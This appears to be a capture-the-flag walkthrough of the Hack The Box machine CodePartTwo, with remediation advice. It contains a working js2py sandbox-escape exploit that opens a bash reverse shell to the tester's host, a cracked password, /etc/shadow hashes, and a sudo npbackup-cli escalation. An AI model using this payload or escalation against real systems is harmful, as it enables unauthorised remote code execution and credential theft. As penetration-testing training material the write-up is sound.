+++
title = "HTB Walkthrough: CodePartTwo"
date = "2025-11-22"
[taxonomies]
tags = ["cybersecurity", "HTB", "walkthrough", "penetration-testing"]
[extra]
toc = true
protected = true
retired_date = "2025-12-22"
password = "09cd485933fb29e34fefb7f5a9ea00d8"
+++

# HTB Walkthrough: CodePartTwo

![](codeparttwo.png)


| Name                     | CodePartTwo                                     |
|--------------------------|-------------------------------------------------|
| Location                 | https://app.hackthebox.com/machines/CodePartTwo |
| Difficulty               | Easy                                            |
| OS                       | Linux                                           |
| Weaknesses found                 |[CWE-94: Insecure Control of Code Generation](https://cwe.mitre.org/data/definitions/94.html)|
|                          |[CWE-95: Eval injection](https://cwe.mitre.org/data/definitions/95.html)                         |
|                          |[CWE-427: Uncontrolled Search Path Element](https://cwe.mitre.org/data/definitions/427.html)                         |
|                          |[CWE-1391: Weak Passwords](https://cwe.mitre.org/data/definitions/1391.html)|
|                          |[CWE-759: Use of a one-way hash without a salt](https://cwe.mitre.org/data/definitions/759.html)|
| Known Vulnerabilities found    |[CVE-2024-28397](https://nvd.nist.gov/vuln/detail/CVE-2024-28397)|
| Points                   | 20                                              |
| Rating at time of pwning | 4.4                                             |
| Date pwnd                | 22nd Nov 2025                                   |

## Overview

Welcome back to another CTF write-up for practicing penetration testing and reporting skills!

`CodePartTwo` is an easy level Ubuntu Linux box hosted on the hackthebox platform, hosting a developer centric website. This CTF teaches the importance of keeping libraries up to date, avoiding allowing untrusted users to run code on your infrastructure, even when you've tried to sandbox them.

## Executive summary
`CodePartTwo` is vulnerable to a sandbox escape [CVE-2024-28397](https://nvd.nist.gov/vuln/detail/CVE-2024-28397) leading to remote code execution on t the server as the `app` user. This allows an attacker to access the application database which contains a raw MD5 hash for another user `marco`. This password is both crackable in under a minute on modern hardware, and is reused as the SSH password for `marco`. Further, despite `marco` being a low privilege user, they are allowed to run `npbackup-cli` as the superuser.

Unfortunately this CLI tool can be configured to read and write to the root filesystem allowing a low privileged user to acces the `root` SSH private key, _which is passwordless_, and gain full access to the box.

### Suggested remediations

1. Maintain regular patching of code libraries and dependencies in the web application
2. Reconsider allowing code execution directly against the webserver host via the website, apply segregation of responsibility to the application architecure, e.g. use of epehermeral execution environments that cannot access the webserver host.
3. Ensure passwords are strong and not reused between applications and services. Always use password protected certificates for all privileged access (e.g. via SSH, databases, etc)
4. Avoid manual backup procedures that rely on low privileged users having elevated privilege. Consider a seperate backup server with RBAC to prevent unauthorized access to the webservers root filesystem.

# My review: 4 stars

I enjoyed this box as it was simple and somewhat realistic - developer tooling has historically been a problematic area because of the need to run as administrator on workstations, and CI/CD tooling needing to allow remote arbitrary code excetion as a feature. Normally this would be considered a security flaw - not a feature! So the owners of these tools need to be extremely careful about sandboxing the environment that allows untrusted input.
 I deducted a star because the premise of the box is still reasonably contrived and this makes the foothold a little bit too easy in my opinion, there aren't too many good reasons to allow a remote user to execute random javascript on your environment, and it just demands attention from would be attackers.

# Testing Method

## Recon

### nmap scan
We start with `nmap` to perform a full port scan (`-p-`) using service detection (`-sV`), default scripts (`-sC`), disabled ping probes (`-Pn`) and outputting the scan results to a text file (`-oN [filename]`).

```bash
┌──(seska㉿kali)-[~/htb/codeparttwo]
└─$ nmap -vv -Pn -T4 -sV -sC -p- -oN "/home/kali/htb/codeparttwo/scans/_quick_tcp_nmap.txt"
```
This scan reveals two TCP services running on port 8000 (a HTTP service) and port 22 (SSH Access)
![](codeparttwo-portscan.png)

### Port 22 (SSH 8.2p1)
The SSH server is configured with some old and insecure algorithms. This can be assessed by `ssh-audit` however this isn't a particularly relevant finding initially. However this is still report worthy. This also suggests an Ubuntu environment.

```bash
┌──(seska㉿kali)-[~/htb/codeparttwo]
└─$ ssh-audit codeparttwo
# general
(gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13
(gen) software: OpenSSH 8.2p1

<SNIP>

# algorithm recommendations (for OpenSSH 8.2)
(rec) -ecdh-sha2-nistp256                   -- kex algorithm to remove
(rec) -ecdh-sha2-nistp384                   -- kex algorithm to remove
(rec) -ecdh-sha2-nistp521                   -- kex algorithm to remove
(rec) -ecdsa-sha2-nistp256                  -- key algorithm to remove
(rec) -hmac-sha1                            -- mac algorithm to remove

<SNIP>
```

### Port 8000 (HTTP - Gunicorn/20.0.4)
The web application running on port 8000 does look promising for exploitation: the website source is downloadable and it appears that a registered user can simply run arbitrary javascript in the browser. The source code for the website is also freely available for download.

![](codeparttwo-port-8000.png)
### Source code analysis
By parsing the requirements.txt in the source supplied we find a flask 3.0.3 application and an app secret in the source code:

_app.py_
```python
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3PartTw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)
```

We can also observe that the code that runs when the 'Run Code' button is pressed, appears to use `js2py v0.74` to handle the javascript evaluation via python, executing it server side, and finally bringing back the result as the HTTP response.

This input is largely unsanitized both in and out of the application, giving us rise to consider server side command execution vulnerabilities. XSS is a consideration, although that is complicated by the fact that the result is converted to JSON first.

Since the version of `js2py` is reported as 0.74 in `requirements.txt` it is possible that this code is vulnerable to [CVE-2024-28397](https://nvd.nist.gov/vuln/detail/CVE-2024-28397) - a sanbox escape. This weakness is well-known and best described by [CWE-94: Insecure Control of Code Generation](https://cwe.mitre.org/data/definitions/94.html)

_The offending code defining the /run_code route in app.py_
```python
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})

```

## Foothold - app user
There is a publicly available exploit example on [github](https://github.com/releaseown/exploit-js2py/blob/11203e63de577d251271b25911ffdff5cdf050c4/exploit_js2py.php#L108) that we can modify and use to gain a foothold on the webserver. We don't need the PHP wrapper to execute this since we have the websites JS sandbox at our disposal. By modifying the first line we can cause the webserver to attempt to pipe a bash shells input and output to our machine at `10.10.14.19:4242`. This script uses the fact that `js2py` versions up to `0.74` would inadvertantly allow the running code to read into the python `subprocess` library and execute the `Popen` command. It does this under the same privilege as the user running the website.

_exploit.js_
```javascript
let command = "bash -c 'bash -i >& /dev/tcp/10.10.14.19/4242 0>&1'"
let hacked, byseska, n11
let getattr, obj

base = '__base__'
getattribute = '__getattribute__'
hacked = Object.getOwnPropertyNames({})
byseska = hacked[getattribute]
n11 = byseska("__getattribute__")
obj = n11("__class__")[base]
getattr = obj[getattribute]
sub_class = '__subclasses__';

function findpopen(o) {
    let result;
    for(let i in o[sub_class]()) {
        let item = o[sub_class]()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(command, -1, null, -1, -1, -1, null, null, true).communicate()
```

By setting up a listener and running this in the browser, we gain a foothold as username `app`.
```bash
┌──(seska㉿kali)-[~/htb/codeparttwo]
└─$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.14.19] from (UNKNOWN) [10.129.232.59] 40176
bash: cannot set terminal process group (922): Inappropriate ioctl for device
bash: no job control in this shell
app@codeparttwo:~/app$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)

app@codeparttwo:~/app$
```

## Post-Exploitation

A quick `cat /etc/passwd` shows us that there is `root`, `app` and `marco` as shelled users on the box. We don't have access to marco's files so we either need to escalate our privileges to root or marco in order to solve this box.

The `/home/app/app/instance` directory houses the users.db file that we can exfiltrate and inspect offline. It is a SQLite 3.x database. Kali comes with sqlitebrowser, that gives us a GUI way to browse its contents, and its in the `users` table where we can find the password hash for the user `marco`.

![](codeparttwo-sqlite.png)

These are raw MD5 hashes and the `marco` hash is vulnerable to a dictionary attack using `john`
```bash
┌──(seska㉿kali)-[~/htb/codeparttwo]
└─$ john ./hashes.txt --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status

sweetangelbabylove (marco)
```
By using the username `marco` and password `sweetangelbabylove` we're able to login via SSH as marco and get the first flag for the foothold!

## Privilege Escalation

Inspecting the sudoers with `sudo -l` shows that marco can run a backup utility called `npbackup-cli` with sudo, making this a possible privesc vulnerability if we can force this tool to do our bidding.

```bash
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

### LoLbin: npbackup-cli

As luck would have it, there is a misconfiguration based privilege escalation proof of concept on [github](https://github.com/AliElKhatteb/npbackup-cli-priv-escalation). By uploading and modifying this file we can read the root flag or the shadow file.

```bash
marco@codeparttwo:/tmp$ sudo npbackup-cli -c ./backup.cfg --backup
2025-11-21 16:47:32,929 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent
<SNIP>

processed 1 files, 1.339 KiB in 0:00
snapshot 763308b2 saved
<SNIP>
```

And following up with this command to dump the backup we saved as root.
```bash
marco@codeparttwo:/tmp$ sudo /usr/local/bin/npbackup-cli -c npbackup.conf --dump /etc/shadow --snapshot-id 763308b2
{"result": false, "reason": "Config file npbackup.conf cannot be read or does not exist"}
marco@codeparttwo:/tmp$ sudo /usr/local/bin/npbackup-cli -c ./backup.cfg --dump /etc/shadow --snapshot-id 763308b2
root:$6$UM1RuabUYlt5BQ5q$ZtzAfYOaCaFxA8MGbyH1hegFpzQmJrpIkx7vEIKvXoVl830AXAx1Hgh8r11GlpXgY25LK8wF76nvQYQ1wLSn71:20104:0:99999:7:::
<SNIP>
marco:$6$i5xRI7UVqeBITIby$NQKHXVvAWz7Vl3QkEwgxw0ItF9Lwen4gGCBi.YYiDQTdkgcPABaqfmBzheAM/9JA/9J7szqDzPaIDbkNqc.0V.:20022:0:99999:7:::
app:$6$5iH3Zik78QR8t9Se$bgRAig/YjbMzwOTFME629sLrrTn2avVD9pLFwz0X2zBTz0LYfNIEuw6w5s53NNu2K7IeEJK4D6j9PB6SR.UvC0:20022:0:99999:7:::
```

## Root Access


The above root hash wasn't easily crackable with `john` and `rockyou.txt` so I just used the above approach to guess the flag location and read out `/root/root.txt` to yield the flag: `09cd485933fb29e34fefb7f5a9ea00d8` -- which is a shortcut.

However, it should be noted that the following private key is stored in `/root/.ssh/id_rsa` which can be used to login as the root account.

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<SNIP>
MBhgprGCU3dhhJMQAAAAxyb290QGNvZGV0d28BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

This key is passwordless, and allows immediate SSH access to the flag.

```bash
┌──(seska㉿kali)-[~/htb/codeparttwo]
└─$ ssh root@codeparttwo -i ./root.key
<SNIP>

root@codeparttwo:~# cat root.txt
09cd485933fb29e34fefb7f5a9ea00d8
```
![](codeparttwo-pwnd.png)